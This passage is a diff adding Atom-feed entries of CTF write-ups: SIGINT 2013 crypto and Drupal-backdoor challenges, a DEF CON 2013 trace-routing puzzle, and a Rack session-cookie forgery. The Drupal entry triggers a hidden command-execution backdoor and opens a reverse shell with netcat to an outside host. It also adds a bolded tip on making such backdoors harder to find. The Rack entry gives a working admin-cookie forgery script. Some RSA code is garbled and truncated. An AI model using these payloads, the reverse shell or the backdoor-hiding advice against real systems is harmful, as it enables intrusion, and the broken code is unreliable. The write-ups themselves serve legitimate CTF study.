+        p = subprocess.Popen("./crc32", stdin = subprocess.PIPE, stdout = subprocess.PIPE)
+        p.stdin.write(str(len(raw)) + "\n")
+        p.stdin.write(raw + "\n")
+        suffix = p.stdout.read()
+
+        payload = raw + suffix
+
+        print len(payload)
+        print payload
+
+        s.send(payload + "\n")
+        s.send("1\n")
+        sleep(5)
+        print s.recv(4096)
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/go.py">go.py</a><br/>
+Then I read <a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/the_flag.rb">./the_flag.rb</a> and <a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/rsa_keys.rb">./rsa_keys.rb</a>.</p>
+
+<p>The FLAG is <code>goozbartouuu</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SIGINT 2013 crypto 200 rsa]]></title>
+    <link href="http://www.blue-lotus.net/www/sigint-2013-crypto-200-rsa/"/>
+    <updated>2013-07-10T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/sigint-2013-crypto-200-rsa</id>
+    <content type="html"><![CDATA[<p><a href="http://slipper.tk/writeup/2013/07/10/sigint-2013-crypto-rsa/">http://slipper.tk/writeup/2013/07/10/sigint-2013-crypto-rsa/</a></p>
+
+<h1><a href="http://slipper.tk/writeup/2013/07/10/sigint-2013-crypto-rsa/">SIGINT2013 crypto200 rsa</a></h1>
+
+<p>Description</p>
+
+<pre><code>Cryptography is difficult
+authorized_keys
+ssh to challenge@188.40.147.109
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/genrsa.py">genrsa.py</a></p>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/authorized_keys">authorized_keys</a></p>
+
+<p>challenge@188.40.147.109的ssh密钥是用genrsa.py生成的。</p>
+
+<pre><code>SEED = int(time())
+def randfunc(n):
+    def rand():
+        global SEED
+        ret = SEED*0x1333370023004200babe004141414100e9a1192355de965ab8cc1239cf015a4e35 + 1
+        SEED = ret
+        return (ret &amp;gt;&amp;gt; 0x10) &amp;amp; 0x7fff
+    ret = ""
+    while len(ret)  id_rsa.pub &amp;amp;&amp;amp; rm pub")`显然非常慢。更好的办法是从公钥中解出N，每次比较生成的N是否相同。
+</code></pre>
+
+<p>RSAPublicKey的结构：</p>
+
+<ul>
+<li>The key type</li>
+<li>A chunk of PEM-encoded data</li>
+<li>A comment</li>
+</ul>
+
+
+<p>PEM是<a href="http://en.wikipedia.org/wiki/Base64#Privacy-enhanced_mail">Privacy Enhanced Mail</a>的缩写。<br/>
+对于ssh密钥，PEM是由一些小数据块(big-endian)组成的。每一块前面是数据长度，后面就是数据。</p>
+
+<pre><code>def b2i(s):
+        ret = 0L
+        for i in s:
+                ret = (ret &amp;lt;&amp;gt; 0x10) &amp;amp; 0xff
+    ret = ""
+    while len(ret) &amp;lt; n:
+        ret += chr(rand())
+    return ret
+
+def guess(x):
+        global seed
+        seed = x
+        keypair = RSA.generate(1024, randfunc)
+        if  getattr(keypair, &amp;#039;n&amp;#039;) != N :
+            return False
+        print getattr(keypair, &amp;#039;n&amp;#039;), x
+        return True
+
+if __name__ == &amp;#039;__main__&amp;#039;:
+    #now = 1373041808
+    now = 1373038672    #answer
+    while (not guess(now)):
+            now -= 1
+            print now
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/my.py">my.py</a></p>
+
+<p>SIGINT_some_people_pay_100_euro_for_this<br/>
+<a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/flag">flag</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SIGINT 2013 cloud200 bloat]]></title>
+    <link href="http://www.blue-lotus.net/www/sigint2013-cloud200-bloat/"/>
+    <updated>2013-07-09T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/sigint2013-cloud200-bloat</id>
+    <content type="html"><![CDATA[<p><a href="http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/">http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/</a></p>
+
+<h1><a href="http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/">SIGINT 2013 cloud 200 bloat</a></h1>
+
+<p>Description</p>
+
+<pre><code>My friend set up this site for me. I don't trust him.
+He installed a backdoor for sure. Can you find it?
+He just wrote me, what this system is using.
+Somehow it looks diff-erent o_O:
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/cdd-7.20.tar_0.gz">cdd-7.20.tar_0.gz</a></p>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/source_code.tar.bz2">source_code.tar.bz2</a></p>
+
+<p>这道题比赛的时候只有一个队伍做出来。虽然只有200分，但过程比较复杂。</p>
+
+<p>我本来预期花一两个小时就能解决这个问题，结果却耗费了四个小时。</p>
+
+<p>首先也是最关键的问题就是如何找到后门。</p>
+
+<p>这个网站使用的是开源系统drupal 7.20，还附带了一些插件。但问题并不是直接diff那么简单。</p>
+
+<p>官方的源码附有详细的注释，但修改版中将所有注释全部删掉了，还把代码风格从K&amp;R风格改成了一种很混乱的样子，甚至将所有的变量名替换成了奇奇怪怪的东西。</p>
+
+<p>手工查找人眼识别几乎是不可行的。必须想其它办法。</p>
+
+<p>比赛的时候卡在其他题上面了，没有时间仔细看这道题。事后才想起来可以写一个文本处理器，把php文件全部“格式化”一遍：去掉注释+统一格式+统一变量命名。</p>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/filter.cpp">PHP_filter.cpp</a></p>
+
+<p>处理注释是最麻烦的一步，要判断引号和各种注释符，最终版本的代码也还有瑕疵。</p>
+
+<p>因为只需要比对出文件的不同之处，所以不需要维护代码风格和变量名。为了统一，我把所有可能换行的<code>{};,:()</code>全都强行换行，又将所有变量名指定成了$000。</p>
+
+<p>用这个非常挫的文本处理器半自动操作，效率已经比人眼识别提升很多，而且出错率降低很多。</p>
+
+<p>但是将所有<code>.php</code>文件对比之后并没有什么收获。</p>
+
+<p>再去查看源码中的文件，发现<code>.php</code>的文件其实并不多。很多插件都是以<code>.inc\.module</code>这样的后缀结尾的。</p>
+
+<p>再扫描一遍<code>.inc</code>后缀的文件，果然发现有一个文件<code>./bloat/modules/openid/openid.inc</code>略有不同。</p>
+
+<pre><code>10 define('OPENID_DH_DEFAULT_GEN', '86');
+</code></pre>
+
+<p>而原版中的openid是</p>
+
+<pre><code>22 /**
+23  * Diffie-Hellman generator; used for Diffie-Hellman key exchange computations.
+24  */
+25 define('OPENID_DH_DEFAULT_GEN', '2');
+</code></pre>
+
+<p>这是跟用户认证有关的一个常量。修改这种值也许会造成认证系统的一些缺陷。</p>
+
+<p>继续看代码，我有了更大的收获。</p>
+
+<p>在<code>./bloat/modules/openid/openid.module</code>中代码逻辑与原版有明显的不同。</p>
+
+<pre><code>197 function openid_login_validate($quench, &amp;amp;$tickers)
+198    {
+199 $return_to = $tickers['values']['openid.return_to'];
+...
+204   openid_begin($tickers['values']['openid_identifier'], $return_to, $tickers['values']);
+... 
+207      function openid_begin($imaginably, $overlay = '', $termination = array())
+...
+212       if(strpos($imaginably, '@'))
+213   {
+214    list($user, $host) = explode('@', $imaginably, 2);                                                                                                                                         
+215 }
+216 else
+217     {
+218      $user = false;
+219      $host = false;
+220      }
+</code></pre>
+
+<p><code>214    list($user, $host) = explode('@', $imaginably, 2);</code>中<code>$imaginably</code>正是用户提交的认证用户名。</p>
+
+<p>再来看看这些变量做了什么。</p>
+
+<pre><code>248 $user_enc = _openid_dh_long_to_base64($user * OPENID_DH_DEFAULT_GEN);
+249     $service['uri'] = drupal_map_assoc(array($host), $user_enc);
+259   openid_redirect($service['uri'], $ramparts);
+</code></pre>
+
+<p>这里用到了修改过的常量<code>OPENID_DH_DEFAULT_GEN</code>。</p>
+
+<p>drupal&#95;map&#95;assoc()返回的是数组，所以在redirect过程中会被强转成字符串&#8221;Array&#8221;，最后在跳转的时候会出错。</p>
+
+<p>而这个<a href="https://api.drupal.org/api/drupal/includes%21common.inc/function/drupal_map_assoc/7">drupal&#95;map&#95;assoc()</a>则暗藏玄机。</p>
+
+<p>根据官方文档，drupal&#95;map&#95;assoc()会把第一个参数$array中的每个参数依次传入第二个参数$callable执行并返回一个数组。</p>
+
+<p>这里藏着一个命令执行后门啊。。。。</p>
+
+<p>只要<code>is_callable($user_enc)</code>就能直接执行<code>$user_enc($host)</code>。</p>
+
+<p>而<code>$user_enc</code>是从<code>$user * OPENID_DH_DEFAULT_GEN</code>解出来的。</p>
+
+<p>因为<code>OPENID_DH_DEFAULT_GEN</code>的限制，所以这个<code>$user_enc</code>必须是按照base64解成整形之后能整除86（中间还有一些过程）。</p>
+
+<p>现在要做的就是找一个合适的函数，恰好能满足这个条件了。</p>
+
+<pre><code>slipper@NULL:~/CTF/SigintCTF2013/cloud/bloat/bloat/modules/openid$ php -a
+Interactive shell
+
+php &amp;gt; include './openid.inc';
+php &amp;gt; var_dump(is_callable('system'));
+bool(true)
+php &amp;gt; var_dump(is_callable('systeM'));
+bool(true)
+php &amp;gt; echo _openid_dh_base64_to_long('system')/OPENID_DH_DEFAULT_GEN ."\n";
+34952922.72093
+php &amp;gt; echo _openid_dh_base64_to_long('System')/OPENID_DH_DEFAULT_GEN ."\n";
+14664196.395349
+php &amp;gt; echo _openid_dh_base64_to_long('SYstem')/OPENID_DH_DEFAULT_GEN ."\n";
+14347185.046512
+php &amp;gt; echo _openid_dh_base64_to_long('eval')/OPENID_DH_DEFAULT_GEN ."\n";
+93703.872093023
+php &amp;gt; echo _openid_dh_base64_to_long('exec')/OPENID_DH_DEFAULT_GEN ."\n";
+93802
+</code></pre>
+
+<p>因为这里的is&#95;callable是不区分大小写的，本来我还以为后门作者刻意选择了大小写混用的函数名，本来差点要写程序暴搜的。还好偶然发现exec正好符合要求。^&#95;^</p>
+
+<p><strong>如果以后要用这种方法做后门，记得一个有大因子的大小写混用的函数名哦。</strong></p>
+
+<p>接下来就是命令执行了。</p>
+
+<p>可是用<code>93802@echo a &amp;gt; a</code>结果并没有生成文件a。似乎对网站的目录木有写权限。</p>
+
+<p>如果要获取flag，必须要有传递信息的途径。</p>
+
+<p>唯一能想到的方法就只有反连了。</p>
+
+<p>幸运的是服务起的nc有-e选项，正好可以交互，不然还得一次一次地执行命令。</p>
+
+<p>用<code>93802@nc x.x.x.x 8080 -e /bin/sh</code>反弹，本地用<code>nc -l 8080</code>监听。</p>
+
+<pre><code>pwd
+/var/www
+ls -la ./
+total 7904
+drwxr-xr-x  9 root root    4096 Jul  5 01:23 .
+drwxr-xr-x 14 root root    4096 Jul  5 01:53 ..
+-rw-r--r--  1 root root   75028 Mar  7 17:26 CHANGELOG.txt
+-rw-r--r--  1 root root    1481 Mar  7 17:26 COPYRIGHT.txt
+...
+-rw-r--r--  1 root root      34 Jul  5 01:01 ___F_L_A_G___
+...
+cat ___F_L_A_G___
+not here, see /flag on filesystem
+cat /flag
+SIGINT_d4b0844c
+</code></pre>
+
+<p>看来果然是木有写权限～～</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 OMGACM 4 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-omgacm-4-writeup/"/>
+    <updated>2013-06-18T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-omgacm-4-writeup</id>
+    <content type="html"><![CDATA[<h1>Problem Description</h1>
+
+<p>Each problem gives you a circuit board, which will have a dimension, a set of nulls (that trace cannot go through), a feed point, and a set of antenna points.</p>
+
+<p>Your goal is to draw a trace for each antenna point that starts at the feed point, ends at the antenna point and does not intersect other traces.</p>
+
+<p>The distance of these traces must also be equal for all antenna points.</p>
+
+<h1>Our Solution</h1>
+
+<p>Since we intuitively classify this problem as NP-Complete, we resort to iterative deepening depth-first search for solving it.</p>
+
+<p>In our algorithm, we choose to &#8220;grow&#8221; the traces from antenna points, which means that all the traces simultaneously start from their respective antenna point and go one step further one by one.</p>
+
+<p>This strategy forces that all the traces will be equal length with each other, thus many unnecessary states are avoided.</p>
+
+<p>And if one trace encounters with another trace before reaching the feed point, we can simply merge them into one to eschew intersection.</p>
+
+<p>More specifically, in order to record the current state, we use:</p>
+
+<ol>
+<li>Nine bool variables for each point: one for the point and 8 for adjacent edges;</li>
+<li>One pair &lt; int, int > (one for 1 and the other for sqrt 2) variable for each point to store the distance from this point to the corresponding antenna point if it has been covered by a trace;</li>
+<li>Current &#8220;growing&#8221; point for each trace;</li>
+<li>Which trace’s turn is it to grow in this iteration;</li>
+<li>The final distance, if one of the traces has reached the feed point;</li>
+</ol>
+
+
+<p>And we also use a set of pruning tricks to accelerate the algorithm.</p>
+
+<ol>
+<li>Iterative deepening on length of each path;</li>
+<li>Limit the depth of dfs to be at most 30. (This ought to have been another iterative deepening argument, but we hard code it with an empirical number for simplifying the code);</li>
+<li>Preprocess the minimal distance from each point to the feed point and combine this information with iterative deepening threshold for further pruning;</li>
+<li>If one of the trace has already reached the feed point, use the distance for pruning.</li>
+</ol>
+
+
+<p>Here is another tip:</p>
+
+<p>The intersections will not only happen at points but also in small squares, you may need to double check this.</p>
+
+<h1>Code</h1>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;map&gt;
+#include &lt;set&gt;
+#include &lt;vector&gt;
+#include &lt;queue&gt;
+#include &lt;string.h&gt;
+using namespace std;
+
+typedef unsigned long long llu;
+#define MAX 100
+#define mp make_pair
+#define pb push_back
+
+bool Null[MAX][MAX], Null2[MAX][MAX];
+int XY[MAX][MAX];
+int N, M, eN, fX, fY, P, UP;
+int dy[] = {1, 0, -1, 1, -1, 1, 0, -1};
+int dx[] = {1, 1, 1, 0, 0, -1, -1, -1};
+int verse[] = {8, 7, 6, 5, 4, 3, 2 , 1};
+set&lt;vector&lt;bool&gt; &gt; S;
+pair&lt;int, int&gt; dp[] = {
+    mp(0, 1),
+    mp(1, 0),
+    mp(0, 1),
+    mp(1, 0),
+    mp(1, 0),
+    mp(0, 1),
+    mp(1, 0),
+    mp(0, 1)
+};
+
+struct node {
+    vector&lt;bool&gt; t;
+    vector&lt;pair&lt;int, int&gt; &gt; len;
+    int cnt;
+    pair&lt;int, int&gt; ans;
+    vector&lt;pair&lt;int, int&gt; &gt; now;
+    vector&lt;bool &gt; used;
+    int I;
+};
+node Key;
+
+int get(int x, int y) {
+    return x*M + y;
+}
+
+pair&lt;int, int&gt; getLen(int j) {
+    return mp(Key.len[get(Key.now[Key.I].first, Key.now[Key.I].second)].first+dp[j].first, 
+        Key.len[get(Key.now[Key.I].first, Key.now[Key.I].second)].second+dp[j].second);
+}
+
+void output(node ans) {
+    printf("Solution %d\n", P);
+    int kk=0, L=0;
+    for (int i=0; i&lt;N*M; i++) {
+        kk++;
+        int tx = i / M;
+        int ty = i % M;
+        for (int j=0; j&lt;4; j++, kk++) {
+            if (ans.t[kk])
+                L++;
+        }
+        kk+=4;
+    }
+    printf("Line %d\n", L);
+    int k=0;
+    for (int i=0; i&lt;N*M; i++) {
+        k++;
+        int tx = i / M;
+        int ty = i % M;
+        for (int j=0; j&lt;4; j++, k++) {
+            if (ans.t[k])
+                printf("Segment %d %d %d %d\n", tx, ty, tx+dx[j], ty+dy[j]);
+        }
+        k+=4;
+    }
+}
+
+bool none() {
+    for (int i=0; i&lt;eN; i++)
+        if (Key.used[i]) return false;
+    return true;
+}
+
+int myabs(int xx) {
+    if (xx&lt;0) return -xx;
+    return xx;
+}
+
+
+int UPPER_BOUND = 28;
+void dfs(int depth) {
+    if (depth &gt; UPPER_BOUND) return;
+
+    int x = Key.now[Key.I].first;
+    int y = Key.now[Key.I].second;
+
+    int i = rand() % 8;
+    for (int iii=0; iii&lt;8; iii++, i=(i+1)%8) {
+        int newX = x + dx[i];
+        int newY = y + dy[i];
+
+        if (newX &lt; 0 || newX &gt;= N) continue;
+        if (newY &lt; 0 || newY &gt;= M) continue;
+        if (Null[newX][newY]) continue;
+        if (XY[newX][newY] == -1 || getLen(i).first + getLen(i).second + XY[newX][newY] &gt; UP) continue;
+        if (Key.cnt &gt; 0 &amp;&amp;
+                            (Key.ans.first &lt; getLen(i).first || Key.ans.second &lt; getLen(i).second) ) continue;
+        if (Key.cnt &gt; 0 &amp;&amp;
+                            (Key.ans.first == getLen(i).first &amp;&amp; Key.ans.second == getLen(i).second) ) continue;
+
+
+        if (i == 0) {
+            if (Key.t[get(x+1, y) * 9 + 6]) continue;
+        }
+        if (i == 2) {
+            if (Key.t[get(x+1, y) * 9 + 8]) continue;
+        }
+        if (i == 7) {
+            if (Key.t[get(x, y-1) * 9 + 6]) continue;
+        }
+        if (i == 5) {
+            if (Key.t[get(x, y+1) * 9 + 8]) continue;
+        }
+
+
+        if (newX == fX &amp;&amp; newY == fY) {
+            if (Key.cnt &gt; 0 &amp;&amp; Key.ans != getLen(i)) continue;
+            Key.cnt++; Key.ans = getLen(i);
+            Key.t[(newX*M + newY)*9 + verse[i]] = true;
+            Key.t[get(x, y)*9 + i + 1] = true;
+            Key.used[Key.I] = false;
+            Key.now[Key.I] = mp(newX, newY);
+
+
+            if (Key.cnt &gt; 0 &amp;&amp; none()) {
+                output(Key);
+                exit(0);
+            }
+
+            int II = Key.I, ttt = 0;
+            for (Key.I=(Key.I+1)%eN; ttt&lt;eN; ttt++, Key.I=(Key.I+1)%eN)
+                if (Key.used[Key.I])
+                    break;
+            if (ttt &lt; eN) {
+                dfs(depth+1);
+            }
+
+            Key.t[(newX*M + newY)*9 + verse[i]] = false;
+            Key.t[get(x, y)*9 + i + 1] = false;
+            Key.I = II;
+            Key.used[Key.I] = true;
+            Key.now[Key.I] = mp(x, y);
+            Key.cnt--;
+        } else if (Key.t[get(newX, newY) * 9]) {
+            if (Key.len[newX*M + newY] != getLen(i)) continue;
+
+            Key.t[(newX*M + newY)*9 + verse[i]] = true;
+            Key.t[get(x, y)*9 + i + 1] = true;
+            Key.used[Key.I] = false;
+            Key.now[Key.I] = mp(newX, newY);
+
+            int II = Key.I, ttt = 0;
+            for (Key.I=(Key.I+1)%eN; ttt&lt;eN; ttt++, Key.I=(Key.I+1)%eN)
+                if (Key.used[Key.I])
+                    break;
+            if (ttt &lt; eN) {
+                dfs(depth+1);
+            }
+
+            Key.t[(newX*M + newY)*9 + verse[i]] = false;
+            Key.t[get(x, y)*9 + i + 1] = false;
+            Key.I = II;
+            Key.used[Key.I] = true;
+            Key.now[Key.I] = mp(x, y);
+        } else {
+            Key.t[(newX*M + newY)*9] = true;
+            Key.t[(newX*M + newY)*9 + verse[i]] = true;
+            Key.t[get(x, y)*9 + i + 1] = true;
+            Key.len[newX*M + newY] = getLen(i);
+            Key.now[Key.I] = mp(newX, newY);
+
+            int II = Key.I, ttt = 0;
+            for (Key.I=(Key.I+1)%eN; ttt&lt;eN; ttt++, Key.I=(Key.I+1)%eN)
+                if (Key.used[Key.I])
+                    break;
+            if (ttt &lt; eN) {
+                dfs(depth+1);
+            }
+
+            Key.t[(newX*M + newY)*9] = false;
+            Key.t[(newX*M + newY)*9 + verse[i]] = false;
+            Key.t[get(x, y)*9 + i + 1] = false;
+            Key.I = II;
+            Key.now[Key.I] = mp(x, y);
+        }
+    }
+}
+
+void dfs2(int x, int y) {
+    for (int i=0; i&lt;8; i++) {
+        int newX = x + dx[i];
+        int newY = y + dy[i];
+
+        if (newX &lt; 0 || newX &gt;= N) continue;
+        if (newY &lt; 0 || newY &gt;= M) continue;
+        if (Null[newX][newY]) continue;
+
+        if (XY[newX][newY] != -1 &amp;&amp; XY[newX][newY] &lt;= XY[x][y] + 1) continue;
+        XY[newX][newY] = XY[x][y] + 1;
+        dfs2(newX, newY);
+    }
+}
+
+void solve() {
+    scanf("%*s%d", &amp;P);
+
+    scanf("%*s%*d");
+    scanf("%d%d", &amp;N, &amp;M);
+
+    scanf("%*s%*d");
+    scanf("%d%d", &amp;fX, &amp;fY);
+
+
+
+    Key.t.resize(N * M * 9);
+    Key.len.resize(N * M);
+
+    scanf("%*s%d", &amp;eN);
+    for (int i=0; i&lt;eN; i++) {
+        int tx, ty;
+        scanf("%d%d", &amp;tx, &amp;ty);
+
+        Key.now.pb(mp(tx, ty));
+        Key.t[get(tx, ty) * 9] = true;
+        Key.used.pb(true);
+    }
+
+    int nN;
+    scanf("%*s%d", &amp;nN);
+    memset(Null, 0, sizeof(Null));
+    memset(Null2, 0, sizeof(Null2));
+    for (int i=0; i&lt;nN; i++) {
+        int tx, ty;
+        scanf("%d%d", &amp;tx, &amp;ty);
+        Null[tx][ty] = true;
+        Null2[tx][ty] = true;
+    }
+
+
+
+    memset(XY, -1, sizeof(XY));
+    XY[fX][fY] = 0;
+    dfs2(fX, fY);
+
+    node base = Key;
+    for (UP=6; ; UP++) {
+        dfs(0);
+        Key = base;
+    }
+}
+
+int main() {
+    solve();
+}
+</code></pre>
+
+<h1>Result</h1>
+
+<p>You can check out <a href="http://ascii.io/a/3644">http://ascii.io/a/3644</a> for the result.</p>
+
+<p><strong>CAVEAT:</strong> We use many heuristics in the program, so it will not guarantee success for every run.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 3dub 3 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-3-writeup/"/>
+    <updated>2013-06-18T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-3-writeup</id>
+    <content type="html"><![CDATA[<p>First of all, we got a &#8216;secrets&#8217; link and &#8216;log in or create user&#8217; form. When we create and login, the website redirect us to the &#8216;secrets&#8217; page like this</p>
+
+<pre><code>Secrets
+name    owner   actions
+key admin   show
+nothing asdf    show
+new secret
+</code></pre>
+
+<p>we&#8217;ve got some links to see secrets owned by other users, include the &#8216;admin&#8217;, or easily add a new secret ourselves.</p>
+
+<p>Having a try to open the <a href="http://hypeman.shallweplayaga.me/secrets/0">admin&#8217;s secret</a>, we got a 500 Error Page with some error stack, which powered by the Ruby framework &#8216;Sinatra&#8217;.</p>
+
+<p>From the very first sight of the page, it said &#8216;unauthorized&#8217; as the error message and a piece of source code was provided</p>
+
+<pre><code>end
+
+  redirect '/secrets'
+end
+
+get '/secrets/:id' do
+  s = SECRETS[params[:id].to_i]
+  raise "unauthorized" if session[:user_name] != s.username
+
+  haml :secret, locals: {secret: s}
+end
+
+helpers do
+  def current_user
+    return nil unless session[:user_name]
+</code></pre>
+
+<p>It meant that I&#8217;m not she secret&#8217;s holder. then have a look at the whole page, and you would find some environment variable in the &#8216;Rack ENV&#8217; section, partly like</p>
+
+<p>rack.session</p>
+
+<p><code>{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}</code></p>
+
+<p>rack.session.options</p>
+
+<p><code>{:path=&gt;"/", :domain=&gt;nil, :expire_after=&gt;nil, :secure=&gt;false, :httponly=&gt;true, :defer=&gt;false, :renew=&gt;false, :sidbits=&gt;128, :secure_random=&gt;SecureRandom, :secret=&gt;"wroashsoxDiculReejLykUssyifabEdGhovHabno", :coder=&gt;#}</code></p>
+
+<p>rack.session.unpacked_cookie_data</p>
+
+<p><code>{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}</code></p>
+
+<p>rack.request.cookie_hash</p>
+
+<p><code>{"rack.session"=&gt;"BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n--d637305e23d6693f3ebe276b292293c7ff0b72e6"}</code></p>
+
+<p>we&#8217;ve got some message:</p>
+
+<p>the cookie <code>rack.session</code> is some way encoded of <code>rack.session.unpacked_cookie_data</code>, which is totally the same as env variable <code>rack.session</code>, and the coder mybe <code>Rack::Session::Cookie::Base64::Marshal</code>, secret (if any) maybe &#8216;wroashsoxDiculReejLykUssyifabEdGhovHabno&#8217;</p>
+
+<p>By seeking the source code of rack, we found this(<a href="https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb">https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb</a>)</p>
+
+<pre><code>@secrets = options.values_at(:secret, :_old_secret).compact
+# some code else
+session_data = coder.encode(session)
+if @secrets.first
+  session_data &lt;&lt; "--#{generate_hmac(session_data, @secrets.first)}"
+end 
+# some code else
+def generate_hmac(data, secret)
+  OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
+end
+</code></pre>
+
+<p>Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch</p>
+
+<pre><code>if @secrets.size &gt; 0 &amp;&amp; session_data
+    session_data, digest = session_data.split("--")
+    session_data = nil unless digest_match?(session_data, digest)
+end
+</code></pre>
+
+<p>Meanwhile, we knew the whole process of the session checking. thus, I&#8217;ve wrote a ruby script to figure out this stuff with this way</p>
+
+<ul>
+<li>unpack(decode) the cookie to origin session data</li>
+<li>modify session_data.user_name to &#8216;admin&#8217;</li>
+<li>repack(encode) the session data to cookie string format</li>
+<li>calculate a new digest of the session data then build the cookie</li>
+</ul>
+
+
+<p>codes below for example</p>
+
+<pre><code>#!/usr/bin/ruby
+#Author: xelz@blue-lotus
+
+require 'openssl'
+
+# part of rack/lib/rack/session/cookie.rb
+class Base64
+    def encode(str)
+        [str].pack('m')
+    end
+
+    def decode(str)
+        str.unpack('m').first
+    end
+
+    # Encode session cookies as Marshaled Base64 data
+    class Marshal &lt; Base64
+        def encode(str)
+            super(::Marshal.dump(str))
+        end
+
+        def decode(str)
+            return unless str
+            ::Marshal.load(super(str)) rescue nil
+        end
+    end
+end
+
+def generate_hmac(data, secret)
+   OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
+end
+
+exit() unless ARGV[0]
+
+data = ARGV[0].split('--')[0]
+# puts 'data is:'
+# puts data, "\n"
+
+coder = Base64::Marshal.new
+data = coder.decode(data)
+data['user_name'] = "admin"
+data = coder.encode(data)
+# puts 'modified data is:'
+# puts data, "\n"
+data = data
+
+secret = 'wroashsoxDiculReejLykUssyifabEdGhovHabno'
+# puts 'new digest string is:'
+digest = generate_hmac(data, secret)
+# puts digest, "\n"
+
+puts 'cookie is'
+cookie = data.gsub("\n", "%0A") + '--' + digest
+puts cookie
+</code></pre>
+
+<p>run the script like this:</p>
+
